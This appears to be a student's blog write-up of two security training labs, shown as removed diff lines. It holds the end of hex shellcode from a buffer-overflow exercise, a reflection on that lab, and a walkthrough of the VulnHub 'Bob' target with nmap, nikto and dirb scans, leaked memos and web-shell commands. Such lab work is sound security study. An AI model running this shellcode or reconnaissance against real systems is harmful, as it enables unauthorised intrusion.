class="comment">  &quot;\xE8\x8A\x09\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x0C\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x08\x00\x40\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xC7\x44\x24\x04\x08\x40\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\xE0\x61\x40\x00&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot; </span></span><br><span class="line"><span class="comment">  &quot;\x83\xEC\x10&quot; </span></span><br><span class="line"><span class="comment">  &quot;\xC7\x04\x24\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xA1\x24\x61\x40\x00&quot;</span></span><br><span class="line"><span class="comment">  &quot;\xFF\xD0&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141932525.png" class="" title="image-20240131141932525">
-<h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><h4 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h4><ul>
-<li><strong>理论与实践结合</strong>：通过实验操作，加深了对缓冲区溢出攻击原理的理解。</li>
-<li><strong>问题解决能力</strong>：在实验过程中遇到问题，如编译模式对栈空间的影响，学会了如何查找和解决问题。</li>
-<li><strong>安全意识提升</strong>：认识到了安全编程的重要性，以及在软件开发中预防缓冲区溢出的必要性。</li>
-</ul>
-<h4 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a>实验方法</h4><ol>
-<li>精确定位返回地址的位置：通过调试工具（如OllyDbg）观察程序执行过程中堆栈的变化，找到返回地址。</li>
-<li>寻找一个合适的地址用于覆盖原始地址：使用jmp esp或call esp等指令，跳转到shellcode执行。</li>
-<li>编写shellcode到相应的缓冲区中：编写能够执行特定功能的shellcode，并将其放入程序的缓冲区。</li>
-</ol>
-<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ul>
-<li>成功实现了缓冲区溢出，程序执行了预期的MessageBox弹窗警告。</li>
-<li>通过IDA Pro分析，确认了shellcode执行后程序的控制流程。</li>
-</ul>
-<h4 id="分析与讨论"><a href="#分析与讨论" class="headerlink" title="分析与讨论"></a>分析与讨论</h4><ul>
-<li>实验结果符合预期，验证了缓冲区溢出攻击的可行性。</li>
-<li>实验中遇到的问题，如编译模式对栈空间的影响，以及动态链接库的加载，都对攻击成功与否有重要影响。</li>
-</ul>
-<h4 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h4><ul>
-<li>缓冲区溢出攻击是一种有效的软件漏洞利用技术，需要开发者在编写程序时注意边界检查和内存管理。</li>
-<li>实验加深了对缓冲区溢出攻击原理的理解，提高了安全编程意识。</li>
-</ul>
-<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ul>
-<li><strong>实验目的达成</strong>：成功完成了缓冲区溢出攻击的模拟，实现了预期的功能。</li>
-<li><strong>实验过程记录</strong>：详细记录了实验步骤和遇到的问题，为后续分析提供了依据。</li>
-<li><strong>实验结果分析</strong>：对实验结果进行了分析，与理论预期进行了比较，得出了有意义的结论。</li>
-<li><strong>实验意义</strong>：实验不仅提升了技术能力，更重要的是提高了安全意识，对于未来的软件开发和安全防护工作具有重要意义。</li>
-</ul>
-<h2 id="实训2-项目名称：-Bob渗透测试"><a href="#实训2-项目名称：-Bob渗透测试" class="headerlink" title="实训2 项目名称：   Bob渗透测试"></a>实训2 项目名称：   Bob渗透测试</h2><h4 id="一、环境及工具-1"><a href="#一、环境及工具-1" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><ul>
-<li><strong>操作系统</strong>：Kali Linux</li>
-<li><strong>测试网络</strong>：安全隔离的内部网络，确保实验不影响外部网络</li>
-<li><p><strong>目标主机</strong>：模拟的受害者计算机（称为Bob）</p>
-<ul>
-<li>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com/</a><br>靶机名称：bob-101，下载ova格式文件，直接在虚拟机打开，网络适配器中设置为NAT模式网卡即可。</li>
-</ul>
-</li>
-<li><p><strong>前置知识</strong>：网络安全基础，Linux操作系统，渗透测试方法</p>
-</li>
-<li><strong>必要的课程/说明</strong>：网络安全概念，渗透测试原理</li>
-<li><strong>推荐文章链接</strong>：<ol>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">Nmap使用详解</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/124246499">Nikto工具使用教程</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">Dirb使用教程</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6148306.html">NC工具使用方法</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/220143826">https://zhuanlan.zhihu.com/p/220143826</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1fq4y1H7no?from=search&amp;seid=15707938581315721996&amp;spm_id_from=333.337.0.0</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/z2560088/article/details/120397193">https://blog.csdn.net/z2560088/article/details/120397193</a></li>
-</ol>
-</li>
-</ul>
-<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ol>
-<li><strong>Nmap</strong>：用于主机发现和端口扫描</li>
-<li><strong>Nikto</strong>：用于网站漏洞扫描</li>
-<li><strong>Dirb</strong>：用于敏感文件和目录的探索</li>
-<li><strong>Burp Suite</strong>：用于Web应用的安全测试</li>
-<li><strong>Netcat（NC）</strong>：用于网络操作，如端口监听和Shell连接</li>
-</ol>
-<h5 id="实验概述-1"><a href="#实验概述-1" class="headerlink" title="实验概述"></a>实验概述</h5><p><strong>目的</strong>：通过对目标主机Bob的渗透测试，理解和掌握基本的网络安全渗透方法。</p>
-<p><strong>要求</strong>：</p>
-<ul>
-<li>完成对目标主机的信息收集</li>
-<li>执行渗透测试</li>
-<li>获取目标主机控制权</li>
-<li>进行后续的深度渗透和数据分析</li>
-</ul>
-<p><strong>原理</strong>：使用渗透测试工具进行目标主机的漏洞扫描、利用发现的漏洞获取目标主机的控制权，从而理解攻击者可能利用的方法和手段。</p>
-<h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><p>靶场</p>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bob-101,226/">Bob: 1.0.1 ~ VulnHub</a> </p>
-<p>攻击工具<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&amp;spm=1001.2101.3001.7020">kali</a>虚拟机</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871442433-3.png" class="" title="img">
- <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16.png" class="" title="img">
-<p> 直接双击打开即可添加到虚拟机。打开后网卡使用NAT模式。</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871446757-6.png" class="" title="img">
-<p>没有给用户名和密码。（给了就没有攻击的必要了 hhh）</p>
-<h4 id="二、实训流程及分析-1"><a href="#二、实训流程及分析-1" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h4><h5 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h5><ul>
-<li><strong>操作</strong>：使用Nmap进行目标主机发现和端口扫描。</li>
-<li><strong>目的</strong>：确定目标主机在网络上的存在，并识别开放的端口和服务。</li>
-<li><strong>分析</strong>：通过扫描结果，获取目标主机的网络结构和潜在漏洞点。</li>
-</ul>
-<h5 id="2-网站信息收集"><a href="#2-网站信息收集" class="headerlink" title="2. 网站信息收集"></a>2. 网站信息收集</h5><ul>
-<li><strong>操作</strong>：使用Nikto扫描目标网站。</li>
-<li><strong>目的</strong>：寻找网站潜在的安全漏洞和敏感信息。</li>
-<li><strong>分析</strong>：识别出的漏洞为后续的渗透提供了切入点。</li>
-</ul>
-<h5 id="3-敏感文件扫描"><a href="#3-敏感文件扫描" class="headerlink" title="3. 敏感文件扫描"></a>3. 敏感文件扫描</h5><ul>
-<li><strong>操作</strong>：用Dirb工具进行网页敏感文件扫描。</li>
-<li><strong>目的</strong>：探索和识别隐藏的、未经授权的文件和目录。</li>
-<li><strong>分析</strong>：发现的敏感文件可能包含有用的信息，为进一步的渗透提供帮助。</li>
-</ul>
-<h5 id="4-渗透测试"><a href="#4-渗透测试" class="headerlink" title="4. 渗透测试"></a>4. 渗透测试</h5><ul>
-<li><strong>操作</strong>：通过Webshell在浏览器中执行命令。</li>
-<li><strong>目的</strong>：验证网站的安全性和执行服务器命令的能力。</li>
-<li><strong>分析</strong>：执行的命令和反馈结果帮助了解目标系统的内部结构。</li>
-</ul>
-<h5 id="5-抓包分析"><a href="#5-抓包分析" class="headerlink" title="5. 抓包分析"></a>5. 抓包分析</h5><ul>
-<li><strong>操作</strong>：使用Burp Suite捕捉和分析网络流量。</li>
-<li><strong>目的</strong>：观察数据传输过程，寻找可能的安全漏洞。</li>
-<li><strong>分析</strong>：捕获的数据包揭示了Web应用的通信细节和潜在的安全问题。</li>
-</ul>
-<h5 id="6-获取Shell控制权"><a href="#6-获取Shell控制权" class="headerlink" title="6. 获取Shell控制权"></a>6. 获取Shell控制权</h5><ul>
-<li><strong>操作</strong>：通过Netcat在Kali上监听端口，然后通过Burp Suite发起Shell链接。</li>
-<li><strong>目的</strong>：获得目标主机的控制权。</li>
-<li><strong>分析</strong>：成功连接到Shell意味着可以远程控制目标主机。</li>
-</ul>
-<h5 id="7-具体细节"><a href="#7-具体细节" class="headerlink" title="7. 具体细节"></a>7. 具体细节</h5><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104101540865.png" class="" title="image-20240104101540865">
-<p><strong>本地信息收集</strong><br>打开kali（集成了大量渗透工具）。<br>使用nmap扫描神器探测本网段存活主机IP，从而确定靶机IP地址。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.233.135  netmask 255.255.255.0  broadcast 192.168.233.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe98:3ed0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:98:3e:d0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 3959  bytes 3668336 (3.4 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2113  bytes 305050 (297.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 448  bytes 36416 (35.5 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 448  bytes 36416 (35.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105100943.png" class="" title="image-20240104105100943">
-<p><code>192.168.233.135</code>kali IP段</p>
-<p><code>nmap -sP 192.168.233.0/24</code></p>
-<p>查看kali本机IP<br>全面探测端口并将结果导出至<code>nmap.A</code>，全面扫描是因为有些服务会被改端口号，而我们会用到这些端口号，可以看到ssh端口被改。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.233.0/24</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.1</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.2</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:50:56:EA:3E:CA (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.138</span><br><span class="line">Host is up (0.000075s latency).</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.254</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">MAC Address: 00:50:56:F7:F3:DD (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.233.135</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105348461.png" class="" title="image-20240104105348461">
-<p>bob地址</p>
-<blockquote>
-<p><code>192.168.233.138</code></p>
-</blockquote>
-<p>nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -A  192.168.233.138 -p- -oN nmap192.168.233.138</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-04 10:58 CST</span><br><span class="line">Nmap scan report for 192.168.233.138</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">| /login.php /dev_shell.php /lat_memo.html </span><br><span class="line">|_/passwords.html</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 84f2f8e5ed3e14f393d41e4c413ba2a9 (RSA)</span><br><span class="line">|   256 5b98c74f846efd566a351683aa9ceaf8 (ECDSA)</span><br><span class="line">|_  256 391656fb4e0f508540d3532241433815 (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:E8:1C:09 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.30 ms 192.168.233.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds</span><br></pre></td></tr></table></figure>
-<p>收集到靶机开启了http和ssh服务及其对应的端口号和版本。<br><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/88273c8bd8574284b500608dd88d3c39.png" class="" title="在这里插入图片描述"></p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://192.168.233.138/">192.168.233.138</a></p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104110302654.png" class="" title="image-20240104110302654">
-</blockquote>
-<p>经验：多点点多看看，挖掘有用信息，通过浏览网站页面，我们推测Bob J可能是管理员。<br><img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/ca353b6520cc4aac92ab4efecbff6865.png" class="" title="在这里插入图片描述"></p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/a170dfe4c21442a4a16ddbc44c58bb20.png" class="" title="在这里插入图片描述">
-<p>使用nikto工具扫描网站后台信息，其中Robots.txt代表反爬虫机制。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.233.138</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104111710582.png" class="" title="image-20240104111710582">
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nikto -h http://192.168.233.138</span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.233.138</span><br><span class="line">+ Target Hostname:    192.168.233.138</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-01-04 11:16:47 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.25 (Debian)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ /robots.txt: Entry &#x27;/dev_shell.php&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/lat_memo.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ /robots.txt: Entry &#x27;/passwords.html&#x27; is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file</span><br><span class="line">+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ /: Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span><br></pre></td></tr></table></figure>
-<p>这是一次使用Nikto工具对名为”Bob”的靶机（IP地址192.168.233.138）进行的网络安全扫描报告。Nikto是一种流行的开源网络安全扫描工具，用于检测网站的潜在漏洞。以下是对扫描结果的解释和分析：</p>
-<ol>
-<li><p><strong>目标信息</strong>:</p>
-<ul>
-<li>IP地址: 192.168.233.138</li>
-<li>主机名: 192.168.233.138</li>
-<li>目标端口: 80（通常用于HTTP服务）</li>
-<li>扫描时间: 2024年1月4日 11:16:47（GMT+8）</li>
-</ul>
-</li>
-<li><p><strong>发现的问题和潜在漏洞</strong>:</p>
-<ul>
-<li><strong>Web服务器版本</strong>: 使用的是Apache/2.4.25 (Debian)，该版本可能已过时，因为最新的Apache版本至少是2.4.54。使用过时的软件版本可能会暴露已知的安全漏洞。</li>
-<li><strong>X-Frame-Options未设置</strong>: 此HTTP响应头用于防止点击劫持攻击。未设置此头可能使网站容易受到此类攻击。</li>
-<li><strong>缺少X-Content-Type-Options</strong>: 未设置此头可能允许浏览器以与MIME类型不同的方式解释网站内容，可能导致安全问题。</li>
-<li><strong>robots.txt文件的内容</strong>: 发现’/dev_shell.php’、’/lat_memo.html’和’/passwords.html’路径在robots.txt文件中，但可以访问。这可能意味着这些路径包含敏感信息或功能，但未被适当保护。</li>
-<li><strong>ETags信息泄露</strong>: 服务器配置可能会泄漏inode信息，这可以被用来执行一些特定的攻击，如inode枚举。</li>
-<li><strong>允许的HTTP方法</strong>: 发现服务器允许OPTIONS, HEAD, GET, POST方法。额外的方法，特别是OPTIONS，可能会暴露过多的信息给潜在的攻击者。</li>
-</ul>
-</li>
-<li><p><strong>攻击和防御策略</strong>:</p>
-<ul>
-<li><strong>更新Apache服务器</strong>: 应该更新到最新版本以修复已知的安全漏洞。</li>
-<li><strong>配置安全HTTP头</strong>: 应设置X-Frame-Options和X-Content-Type-Options头以增强安全性。</li>
-<li><strong>审核robots.txt文件</strong>: 检查robots.txt文件中提到的路径，确保不会公开敏感信息或功能。</li>
-<li><strong>限制HTTP方法</strong>: 考虑限制服务器上允许的HTTP方法，只允许必要的方法。</li>
-</ul>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.233.138</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.233.138</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan  4 11:37:11 2024</span><br><span class="line">URL_BASE: http://192.168.233.138/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.233.138/ ----</span><br><span class="line">+ http://192.168.233.138/index.html (CODE:200|SIZE:1425)                                        </span><br><span class="line">+ http://192.168.233.138/robots.txt (CODE:200|SIZE:111)                                         </span><br><span class="line">+ http://192.168.233.138/server-status (CODE:403|SIZE:303)                                      </span><br><span class="line">                                                                                                </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jan  4 11:37:14 2024</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113747750.png" class="" title="image-20240104113747750">
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /login.php</span><br><span class="line">Disallow: /dev_shell.php</span><br><span class="line">Disallow: /lat_memo.html</span><br><span class="line">Disallow: /passwords.html</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113947574.png" class="" title="image-20240104113947574">
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Really who made this file at least get a hash of your password to display, hackers can&#x27;t do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don&#x27;t make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. &gt;:(</span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114138182.png" class="" title="image-20240104114138182">
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Memo sent at GMT+10:00 2:37:42 by User: Bob</span><br><span class="line">Hey guys IT here don&#x27;t forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.</span><br><span class="line"></span><br><span class="line">-Bob</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114223567.png" class="" title="image-20240104114223567">
-<p><code>uname -a</code></p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114350590.png" class="" title="image-20240104114350590">
-<p>Output:</p>
-<p>Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux</p>
-<p><strong>BP爬虫</strong>：浏览网页文件，在dev.shell.php中发现有些命令无法使用，因此推测网站存在过滤机制，可能存在白名单。这时候需要用到抓包神器BP：burpsuite，通过抓包搜集有用信息。</p>
-<blockquote>
-<p>burpsuite</p>
-</blockquote>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114724876.png" class="" title="image-20240104114724876">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104134629831.png" class="" title="image-20240104134629831">
-<p>首先需要将本地端口号修改为其他服务不用的端口号，然后把网站流量引流到127.0.0.1的8888端口，需要安装插件foxyproxy，同时新增一项BP并开启foxyproxy。</p>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104135039398.png" class="" title="image-20240104135039398">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104140414325.png" class="" title="image-20240104140414325">
